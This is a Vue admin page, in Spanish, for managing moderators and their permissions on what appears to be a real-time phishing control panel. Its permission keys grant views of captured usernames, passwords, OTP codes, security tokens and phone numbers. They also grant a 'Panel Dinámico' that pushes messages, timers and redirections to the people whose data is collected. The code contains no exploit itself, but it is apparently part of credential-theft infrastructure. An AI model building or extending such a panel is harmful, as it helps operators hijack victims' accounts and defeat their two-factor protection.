<script setup>
import { ref, onMounted } from 'vue'
import { router } from '@inertiajs/vue3'

import Swal from 'sweetalert2'

const props = defineProps({
  admin: { type: Object, default: () => ({ is_superadmin: false, permisos: {} }) }
})
const can = (key) => !!(props.admin?.is_superadmin || props.admin?.permisos?.[key])
const sidebarOpen = ref(false)
function toggleSidebar(){ sidebarOpen.value = !sidebarOpen.value }

const admins = ref([])
const loading = ref(false)
const errorMsg = ref('')

const PERMISSION_KEYS = [
  // Dashboard
  'dashboard.download_csv',
  'dashboard.toggle_sound',
  'dashboard.toggle_realtime',
  'dashboard.clear_all_users',
  'dashboard.comment_add',
  'dashboard.action.copy',
  'dashboard.action.panel_dinamico',
  'dashboard.action.delete_user',
  'dashboard.view_field.usuario',
  'dashboard.view_field.password',
  'dashboard.view_field.otp',
  'dashboard.view_field.token',
  'dashboard.view_field.nombre',
  'dashboard.view_field.email',
  'dashboard.view_field.telefono_movil',
  'dashboard.view_field.telefono_fijo',
  'dashboard.view_field.comentarios',
  'dashboard.view_field.fecha_ingreso',
  // Panel Dinámico
  'panel.send.quick_message',
  'panel.send.custom_message',
  'panel.send.herramientas',
  'panel.send.timer',
  'panel.send.redireccion',
  'panel.view_field.usuario',
  'panel.view_field.password',
  'panel.view_field.otp',
  'panel.view_field.token',
  'panel.view_field.nombre',
  'panel.view_field.email',
  'panel.view_field.telefono_movil',
  'panel.view_field.telefono_fijo',
  'panel.view_field.comentarios',
  'panel.view_field.fecha_ingreso',
  // Gestión de admins
  'manage_admins'
]

const PERMISSION_LABELS = {
  'dashboard.download_csv': 'Descargar CSV',
  'dashboard.toggle_sound': 'Activar/desactivar sonido',
  'dashboard.toggle_realtime': 'Activar/desactivar actualizaciones',
  'dashboard.clear_all_users': 'Vaciar tabla de usuarios',
  'dashboard.comment_add': 'Agregar comentarios',
  'dashboard.action.copy': 'Botón Copiar',
  'dashboard.action.panel_dinamico': 'Acceso a Panel Dinámico',
  'dashboard.action.delete_user': 'Eliminar usuario',
  'dashboard.view_field.usuario': 'Ver usuario',
  'dashboard.view_field.password': 'Ver contraseña',
  'dashboard.view_field.otp': 'Ver código OTP',
  'dashboard.view_field.token': 'Ver token de seguridad',
  'dashboard.view_field.nombre': 'Ver nombre y apellido',
  'dashboard.view_field.email': 'Ver email',
  'dashboard.view_field.telefono_movil': 'Ver teléfono móvil',
  'dashboard.view_field.telefono_fijo': 'Ver teléfono fijo',
  'dashboard.view_field.comentarios': 'Ver comentarios',
  'dashboard.view_field.fecha_ingreso': 'Ver fecha de ingreso',
  'panel.send.quick_message': 'Enviar mensajes rápidos',
  'panel.send.custom_message': 'Enviar mensajes personalizados',
  'panel.send.herramientas': 'Enviar herramientas',
  'panel.send.timer': 'Enviar temporizador',
  'panel.send.redireccion': 'Enviar redirección',
  'panel.view_field.usuario': 'Ver usuario (panel)',
  'panel.view_field.password': 'Ver contraseña (panel)',
  'panel.view_field.otp': 'Ver código OTP (panel)',
  'panel.view_field.token': 'Ver tokens (panel)',
  'panel.view_field.nombre': 'Ver nombre/apellido (panel)',
  'panel.view_field.email': 'Ver email (panel)',
  'panel.view_field.telefono_movil': 'Ver teléfono móvil (panel)',
  'panel.view_field.telefono_fijo': 'Ver teléfono fijo (panel)',
  'panel.view_field.comentarios': 'Ver comentarios (panel)',
  'panel.view_field.fecha_ingreso': 'Ver fecha de ingreso (panel)',
  'manage_admins': 'Gestionar administradores'
}
const humanLabel = (k) => PERMISSION_LABELS[k] || k

const showPermsModal = ref(false)
const selectedAdmin = ref(null)
const editablePerms = ref({})

function openPerms(a){
  selectedAdmin.value = a
  const base = {}
  PERMISSION_KEYS.forEach(k => { base[k] = a.is_admin ? true : !!a.permisos?.[k] })
  editablePerms.value = base
  showPermsModal.value = true
}

async function savePerms(){
  if (!selectedAdmin.value || selectedAdmin.value.is_admin) { showPermsModal.value = false; return }
  try {
    const res = await fetch(`/admin/api/admins/${selectedAdmin.value.id}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content') || ''
      },
      body: JSON.stringify({ permisos: editablePerms.value })
    })
    if (!res.ok) throw new Error('HTTP ' + res.status)
    const data = await res.json()
    selectedAdmin.value.permisos = normalizePerms(data.admin.permisos)
    Swal.fire({ toast: true, position: 'top-end', timer: 1200, showConfirmButton: false, icon: 'success', title: 'Permisos guardados' })
  } catch (e) {
    Swal.fire({ icon: 'error', title: 'Error', text: 'No se pudo guardar' })
  } finally {
    showPermsModal.value = false
  }
}


function normalizePerms(p) { return (p && typeof p === 'object' && !Array.isArray(p)) ? { ...p } : {} }

async function loadAdmins() {
  loading.value = true
  errorMsg.value = ''
  try {
    const res = await fetch('/admin/api/admins', { headers: { 'Accept': 'application/json' } })
    if (!res.ok) throw new Error('HTTP ' + res.status)
    const data = await res.json()
    admins.value = (data.admins || []).map(a => ({
      ...a,
      permisos: normalizePerms(a.permisos)
    }))
  } catch (e) {
    errorMsg.value = 'No se pudo cargar la lista de admins'
  } finally {
    loading.value = false
  }
}

async function togglePerm(admin, key) {
  const next = { ...admin.permisos, [key]: !admin.permisos[key] }
  try {
    const res = await fetch(`/admin/api/admins/${admin.id}`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || ''
      },
      body: JSON.stringify({ permisos: next })
    })
    if (!res.ok) throw new Error('HTTP ' + res.status)
    const data = await res.json()
    admin.permisos = normalizePerms(data.admin.permisos)
    Swal.fire({ toast: true, position: 'top-end', timer: 1200, showConfirmButton: false, icon: 'success', title: 'Permiso actualizado' })
  } catch (e) {
    Swal.fire({ icon: 'error', title: 'Error', text: 'No se pudo actualizar el permiso' })
  }
}

async function createAdmin() {
  const { value: formValues } = await Swal.fire({
    title: 'Crear admin/mod',
    html: '<input id="swal-user" class="swal2-input" placeholder="usuario">' +
          '<input id="swal-pass" class="swal2-input" placeholder="contraseña" type="password">',
    focusConfirm: false,
    showCancelButton: true,
    preConfirm: () => {
      const usuario = document.getElementById('swal-user').value
      const clave = document.getElementById('swal-pass').value
      if (!usuario || !clave) return Swal.showValidationMessage('Usuario y contraseña son requeridos')
      return { usuario, clave }
    }
  })
  if (!formValues) return

  try {
    const res = await fetch('/admin/api/admins', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || ''
      },
      body: JSON.stringify({ usuario: formValues.usuario, clave: formValues.clave, is_mod: true })
    })
    if (!res.ok) throw new Error('HTTP ' + res.status)
    await loadAdmins()
  } catch (e) {
    Swal.fire({ icon: 'error', title: 'Error', text: 'No se pudo crear el admin/mod' })
  }
}

async function deleteAdminRow(admin) {
  const ok = await Swal.fire({ title: 'Eliminar admin/mod', text: `¿Eliminar ${admin.usuario}?`, icon: 'warning', showCancelButton: true })
  if (!ok.isConfirmed) return
  try {
    const res = await fetch(`/admin/api/admins/${admin.id}`, {
      method: 'DELETE',
      headers: {
        'Accept': 'application/json',
        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || ''
      }
    })
    if (!res.ok) throw new Error('HTTP ' + res.status)
    admins.value = admins.value.filter(a => a.id !== admin.id)
  } catch (e) {
    Swal.fire({ icon: 'error', title: 'Error', text: 'No se pudo eliminar' })
  }
}

onMounted(loadAdmins)
</script>

<template>
  <div class="min-h-screen bg-gray-900">
    <!-- Sidebar overlay -->
    <div v-if="sidebarOpen" class="fixed inset-0 bg-black bg-opacity-50 z-40" @click="toggleSidebar"></div>
    <!-- Sidebar -->
    <aside :class="['fixed z-50 top-0 left-0 h-full w-64 bg-gray-800 border-r border-gray-700 transform transition-transform', sidebarOpen ? 'translate-x-0' : '-translate-x-full']">
      <div class="p-4 border-b border-gray-700 flex items-center justify-between">
        <div class="flex items-center space-x-2">
          <i class="fas fa-cogs text-yellow-500"></i>
          <span class="text-white font-semibold">Menú Admin</span>
        </div>
        <button @click="toggleSidebar" class="text-gray-400 hover:text-white">
          <i class="fas fa-times"></i>
        </button>
      </div>
      <nav class="p-4 space-y-2">
        <button @click="router.get('/admin/dashboard'); toggleSidebar()" class="w-full text-left px-3 py-2 rounded hover:bg-gray-700 text-gray-200 flex items-center">

          <i class="fas fa-tachometer-alt mr-2 text-gray-400"></i>
          Dashboard
        </button>
        <button v-if="can('manage_admins')" @click="router.get('/admin/mods'); toggleSidebar()" class="w-full text-left px-3 py-2 rounded hover:bg-gray-700 text-gray-200 flex items-center">
          <i class="fas fa-users-cog mr-2 text-gray-400"></i>
          Perfiles / Mods
        </button>
      </nav>
    </aside>

    <header class="bg-gray-800 shadow-lg border-b border-gray-700">
      <div class="w-full px-4 sm:px-6 lg:px-8">
        <div class="flex justify-between items-center py-4">
          <div class="flex items-center">
            <button @click="toggleSidebar" class="mr-3 p-2 rounded bg-gray-700 hover:bg-gray-600 text-gray-200" title="Menú">
              <i :class="sidebarOpen ? 'fas fa-times' : 'fas fa-bars'"></i>
            </button>
            <i class="fas fa-users-cog text-2xl text-emerald-400 mr-3"></i>
            <h1 class="text-xl font-semibold text-white"> Perfiles / Mods</h1>
          </div>
          <div class="flex items-center space-x-3">
            <button @click="createAdmin" class="bg-emerald-600 hover:bg-emerald-700 text-white px-4 py-2 rounded-lg text-sm">
              <i class="fas fa-user-plus mr-1"></i> Nuevo
            </button>
          </div>
        </div>
      </div>
    </header>

    <main class="w-full px-4 sm:px-6 lg:px-8 py-4">
      <div class="bg-gray-800 border-2 border-gray-700 rounded-lg shadow-lg p-4 md:p-6">
        <p v-if="errorMsg" class="text-red-400 mb-4">{{ errorMsg }}</p>
        <div v-if="loading" class="text-gray-300">Cargando...</div>

        <div v-else class="space-y-6">
          <div class="overflow-x-auto">
            <table class="min-w-full divide-y divide-gray-600">
              <thead class="bg-gray-700">
                <tr>
                  <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">ID</th>
                  <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Usuario</th>
                  <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Superadmin</th>
                  <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Mod</th>
                  <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Acciones</th>
                </tr>
              </thead>
              <tbody class="bg-gray-800 divide-y divide-gray-700">
                <tr v-for="a in admins" :key="a.id" class="hover:bg-gray-700/60">
                  <td class="px-4 py-3 text-sm text-gray-200">{{ a.id }}</td>
                  <td class="px-4 py-3 text-sm text-white">{{ a.usuario }}</td>
                  <td class="px-4 py-3 text-sm">
                    <span class="px-2 py-1 rounded text-xs" :class="a.is_admin ? 'bg-emerald-600/20 text-emerald-300 border border-emerald-600/40' : 'bg-gray-600/20 text-gray-300 border border-gray-600/40'">{{ a.is_admin ? 'Sí' : 'No' }}</span>
                  </td>
                  <td class="px-4 py-3 text-sm">
                    <span class="px-2 py-1 rounded text-xs" :class="a.is_mod ? 'bg-blue-600/20 text-blue-300 border border-blue-600/40' : 'bg-gray-600/20 text-gray-300 border border-gray-600/40'">{{ a.is_mod ? 'Sí' : 'No' }}</span>
                  </td>
                  <td class="px-4 py-3 text-sm">
                    <div class="flex items-center gap-2">
                      <button @click="openPerms(a)" class="bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-1 rounded text-xs">
                        <i class="fas fa-shield-alt mr-1"></i> Permisos
                      </button>
                      <button v-if="!a.is_admin" @click="deleteAdminRow(a)" class="bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-xs">
                        <i class="fas fa-trash mr-1"></i> Eliminar
                      </button>
                    </div>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>


        </div>
      </div>
    </main>

    <!-- Modal de permisos -->
    <div v-if="showPermsModal" class="fixed inset-0 z-50 flex items-center justify-center">
      <div class="absolute inset-0 bg-black/60" @click="showPermsModal=false"></div>
      <div class="relative bg-gray-800 border border-gray-700 rounded-lg w-full max-w-3xl mx-4 p-4">
        <div class="flex items-center justify-between mb-3">
          <h3 class="text-white text-sm font-semibold"><i class="fas fa-shield-alt text-emerald-400 mr-2"></i>Permisos de {{ selectedAdmin?.usuario }}</h3>
          <button class="text-gray-400 hover:text-white" @click="showPermsModal=false"><i class="fas fa-times"></i></button>
        </div>
        <div class="grid md:grid-cols-2 gap-2 max-h-80 overflow-auto pr-2">
          <label v-for="k in PERMISSION_KEYS" :key="k" class="flex items-center gap-2 text-xs text-gray-300">
            <input type="checkbox" v-model="editablePerms[k]" :disabled="selectedAdmin?.is_admin">
            <span>{{ humanLabel(k) }}</span>
          </label>
        </div>
        <div class="mt-4 flex justify-end gap-2">
          <button class="px-3 py-1 rounded bg-gray-700 text-white text-xs" @click="showPermsModal=false">Cancelar</button>
          <button class="px-3 py-1 rounded bg-emerald-600 text-white text-xs disabled:opacity-50" :disabled="selectedAdmin?.is_admin" @click="savePerms">Guardar</button>
        </div>
        <p v-if="selectedAdmin?.is_admin" class="mt-2 text-amber-300 text-xs">El superadmin tiene todos los permisos. No es editable.</p>
      </div>
    </div>

  </div>
</template>

